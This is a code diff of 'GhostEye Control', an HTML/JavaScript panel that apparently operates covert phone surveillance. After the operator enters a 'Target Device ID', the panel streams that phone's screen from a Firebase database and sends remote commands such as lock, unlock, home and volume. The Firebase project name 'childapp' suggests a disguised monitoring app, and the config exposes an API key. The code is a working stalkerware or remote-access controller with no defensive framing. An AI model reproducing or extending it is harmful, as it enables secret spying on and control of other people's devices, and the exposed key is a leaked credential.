@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>GhostEye Admin Panel</title>
+    <title>GhostEye Control</title>
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
@@ -30,8 +30,10 @@
             display: flex; justify-content: space-between; align-items: center; z-index: 10;
         }
         .brand { font-size: 1.2rem; font-weight: bold; color: var(--accent); letter-spacing: 1px; }
+        .brand i { margin-right: 8px; }
+        
         .status-badge { font-size: 0.9rem; display: flex; align-items: center; gap: 8px; }
-        .live-dot { height: 10px; width: 10px; background-color: var(--danger); border-radius: 50%; box-shadow: 0 0 5px var(--danger); }
+        .live-dot { height: 10px; width: 10px; background-color: var(--danger); border-radius: 50%; box-shadow: 0 0 5px var(--danger); transition: 0.3s;}
         .live-dot.active { background-color: var(--accent); box-shadow: 0 0 8px var(--accent); }
 
         /* --- Main Layout --- */
@@ -45,9 +47,26 @@
             background: #000; position: relative; box-shadow: 0 0 50px rgba(0,0,0,0.5);
             overflow: hidden; display: flex; align-items: center; justify-content: center;
         }
-        #screenStream { width: 100%; height: 100%; object-fit: contain; }
+        #screenStream { width: 100%; height: 100%; object-fit: contain; display: none; }
         
-        .offline-msg { position: absolute; color: #444; text-align: center; display: flex; flex-direction: column; align-items: center; }
+        /* --- Login / Offline Screen --- */
+        .offline-msg { 
+            position: absolute; width: 80%;
+            color: #444; text-align: center; 
+            display: flex; flex-direction: column; align-items: center; gap: 15px;
+            z-index: 5;
+        }
+
+        .input-group { display: flex; flex-direction: column; gap: 10px; width: 100%; }
+        .id-input {
+            padding: 10px; border-radius: 8px; border: 1px solid #333;
+            background: #111; color: white; text-align: center; font-size: 1rem;
+            outline: none;
+        }
+        .connect-btn {
+            padding: 10px; border-radius: 8px; border: none;
+            background: var(--accent); color: #000; font-weight: bold; cursor: pointer;
+        }
 
         /* --- Controls --- */
         .side-panel {
@@ -69,6 +88,10 @@
         .nav-item { color: #666; font-size: 1.2rem; cursor: pointer; padding: 10px; }
         .nav-item:hover { color: white; }
 
+        .reset-id {
+            position: absolute; top: 10px; right: 10px; font-size: 0.8rem; color: #555; cursor: pointer;
+        }
+
         @media (max-width: 768px) {
             .screen-container { flex-direction: column; }
             .side-panel { position: relative; right: auto; flex-direction: row; margin-top: 20px; flex-wrap: wrap; justify-content: center; width: 100%; max-width: 300px; }
@@ -82,28 +105,36 @@
         <div class="brand"><i class="fa-solid fa-ghost"></i> GHOST EYE</div>
         <div class="status-badge">
             <span class="live-dot" id="dot"></span> 
-            <span id="statusText" style="color:#888">System Ready</span>
+            <span id="statusText" style="color:#888">Disconnected</span>
         </div>
     </div>
 
     <div class="screen-container">
         <div class="phone-frame">
+            <div class="reset-id" onclick="resetLogin()" title="Change ID"><i class="fa-solid fa-pen"></i></div>
+
             <div id="offlineMsg" class="offline-msg">
-                <i class="fa-solid fa-satellite-dish fa-2x" style="margin-bottom: 10px;"></i>
-                <p id="msgText">Enter Device ID in URL<br>(e.g., ?id=123456)</p>
+                <i class="fa-solid fa-robot fa-3x" style="color: #333;"></i>
+                <div id="loginForm" class="input-group">
+                    <p style="margin:0; font-size:0.9rem; color:#888;">Enter Target Device ID</p>
+                    <input type="text" id="deviceIdInput" class="id-input" placeholder="e.g. 123456">
+                    <button class="connect-btn" onclick="saveAndConnect()">CONNECT</button>
+                </div>
+                <div id="loadingText" style="display:none; color: var(--accent);">Connecting...</div>
             </div>
+
             <img id="screenStream" src="" alt="">
             
             <div class="nav-bar">
-                <div class="nav-item" id="btnRecent" title="Recent Apps"><i class="fa-regular fa-square"></i></div>
-                <div class="nav-item" id="btnHome" title="Home"><i class="fa-regular fa-circle"></i></div>
-                <div class="nav-item" id="btnBack" title="Back"><i class="fa-solid fa-caret-left" style="font-size:1.5rem"></i></div>
+                <div class="nav-item" id="btnRecent"><i class="fa-regular fa-square"></i></div>
+                <div class="nav-item" id="btnHome"><i class="fa-regular fa-circle"></i></div>
+                <div class="nav-item" id="btnBack"><i class="fa-solid fa-caret-left" style="font-size:1.5rem"></i></div>
             </div>
         </div>
 
         <div class="side-panel">
-            <div class="control-btn" id="btnLock" title="Lock Screen"><i class="fa-solid fa-lock"></i></div>
-            <div class="control-btn" id="btnUnlock" title="Wake Screen"><i class="fa-solid fa-lock-open"></i></div>
+            <div class="control-btn" id="btnLock" title="Lock"><i class="fa-solid fa-lock"></i></div>
+            <div class="control-btn" id="btnUnlock" title="Unlock"><i class="fa-solid fa-lock-open"></i></div>
             <div class="control-btn" id="btnVolUp" title="Vol +"><i class="fa-solid fa-plus"></i></div>
             <div class="control-btn" id="btnVolDown" title="Vol -"><i class="fa-solid fa-minus"></i></div>
         </div>
@@ -113,7 +144,7 @@
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { getDatabase, ref, onValue, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
-        // ✅ आपकी ID और CONFIG यहाँ लगी हुई है
+        // ✅ 1. YOUR FIREBASE CONFIG
         const firebaseConfig = {
             apiKey: "AIzaSyDs5ubX4MGyVoCHIJXXgWBpU7wgoS5jcDM",
             authDomain: "childapp-ce1fe.firebaseapp.com",
@@ -124,73 +155,109 @@
             appId: "1:108035285372:web:generated_placeholder"
         };
 
-        // Initialize Firebase
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
-        // Get ID from URL (?id=123456)
-        const urlParams = new URLSearchParams(window.location.search);
-        const currentDeviceId = urlParams.get('id');
+        // Global Variable for ID
+        let currentDeviceId = "";
 
-        if (!currentDeviceId) {
-            document.getElementById('statusText').innerText = "ID Missing";
-            document.getElementById('statusText').style.color = "var(--danger)";
-        } else {
-            console.log("Tracking Device:", currentDeviceId);
-            document.getElementById('statusText').innerText = "Connecting...";
+        // ✅ 2. Page Load hote hi check karega
+        window.onload = function() {
+            // Check LocalStorage (Browser Memory)
+            const savedID = localStorage.getItem("ghost_device_id");
+            
+            if (savedID) {
+                // Agar ID pehle se saved hai, to seedha connect karo
+                connectToDevice(savedID);
+            } else {
+                // Agar nahi hai, to Login Form dikhao
+                document.getElementById('loginForm').style.display = 'flex';
+                document.getElementById('loadingText').style.display = 'none';
+            }
+        };
 
-            // 🔥 Image Listener (Phone ki Screen dekhne ke liye)
+        // ✅ 3. Save Function (Button click par)
+        window.saveAndConnect = function() {
+            const inputVal = document.getElementById('deviceIdInput').value.trim();
+            if(inputVal) {
+                localStorage.setItem("ghost_device_id", inputVal); // Save to Memory
+                connectToDevice(inputVal);
+            } else {
+                alert("Please enter an ID!");
+            }
+        }
+
+        // ✅ 4. Connect Function
+        function connectToDevice(id) {
+            currentDeviceId = id;
+            
+            // UI Update
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('loadingText').style.display = 'block';
+            document.getElementById('loadingText').innerText = "Searching for " + id + "...";
+            document.getElementById('deviceIdInput').value = id;
+
+            console.log("Connecting to:", currentDeviceId);
+
+            // 🔥 Start Listening for Screen
             const imageRef = ref(db, 'live_screens/' + currentDeviceId + '/image');
             
             onValue(imageRef, (snapshot) => {
                 const base64String = snapshot.val();
                 
                 if (base64String) {
+                    // Hide login/loading, Show Screen
                     document.getElementById('offlineMsg').style.display = "none";
+                    document.getElementById('screenStream').style.display = "block";
                     document.getElementById('screenStream').src = "data:image/jpeg;base64," + base64String;
                     
-                    document.getElementById('statusText').innerText = "LIVE: " + currentDeviceId;
+                    // Update Status
+                    document.getElementById('statusText').innerText = "Connected: " + currentDeviceId;
                     document.getElementById('statusText').style.color = "var(--accent)";
                     document.getElementById('dot').classList.add("active");
                 } else {
-                    console.log("Waiting for data...");
+                    document.getElementById('loadingText').innerText = "Waiting for device...";
                 }
             }, (error) => {
-                console.error("Firebase Error:", error);
-                document.getElementById('msgText').innerText = "Permission Denied\nCheck Database Rules";
+                console.error(error);
+                alert("Connection Failed! Check ID.");
+                resetLogin();
             });
         }
 
-        // --- 👇 BUTTONS LOGIC (COMMANDS) 👇 ---
-        // यह फंक्शन Firebase में कमांड लिखता है, और फ़ोन उसे पकड़ लेता है
-        function sendCommand(action) {
-            if(!currentDeviceId) {
-                alert("URL me ID nahi hai!");
-                return;
+        // ✅ 5. Reset / Logout Function
+        window.resetLogin = function() {
+            if(confirm("Change Device ID?")) {
+                localStorage.removeItem("ghost_device_id");
+                location.reload();
             }
+        }
 
-            console.log("Sending Command:", action);
+        // ✅ 6. Send Commands
+        window.sendCommand = function(action) {
+            if(!currentDeviceId) return;
+
+            console.log("Sending:", action);
             
-            // 🔥 Database me 'command' path par data bhejna
+            // Button Animation
+            const btn = event.currentTarget;
+            btn.style.transform = "scale(0.9)";
+            setTimeout(() => btn.style.transform = "scale(1)", 150);
+
             set(ref(db, 'live_screens/' + currentDeviceId + '/command'), {
                 action: action,
-                timestamp: Date.now() // Timestamp zaruri hai taki har command naya lage
-            }).then(() => {
-                console.log("Command sent successfully!");
-            }).catch((error) => {
-                alert("Error Sending Command: " + error.message);
+                timestamp: Date.now()
             });
         }
 
-        // --- BUTTON CLICKS ---
-        document.getElementById('btnRecent').onclick = () => sendCommand('recent');
-        document.getElementById('btnHome').onclick = () => sendCommand('home');
-        document.getElementById('btnBack').onclick = () => sendCommand('back');
-        
-        document.getElementById('btnLock').onclick = () => sendCommand('lock');
-        document.getElementById('btnUnlock').onclick = () => sendCommand('unlock');
-        document.getElementById('btnVolUp').onclick = () => sendCommand('volume_up');
-        document.getElementById('btnVolDown').onclick = () => sendCommand('volume_down');
+        // Assign buttons (Avoids module scope issues)
+        document.getElementById('btnRecent').onclick = (e) => sendCommand('recent');
+        document.getElementById('btnHome').onclick = (e) => sendCommand('home');
+        document.getElementById('btnBack').onclick = (e) => sendCommand('back');
+        document.getElementById('btnLock').onclick = (e) => sendCommand('lock');
+        document.getElementById('btnUnlock').onclick = (e) => sendCommand('unlock');
+        document.getElementById('btnVolUp').onclick = (e) => sendCommand('volume_up');
+        document.getElementById('btnVolDown').onclick = (e) => sendCommand('volume_down');
 
     </script>
 </body>
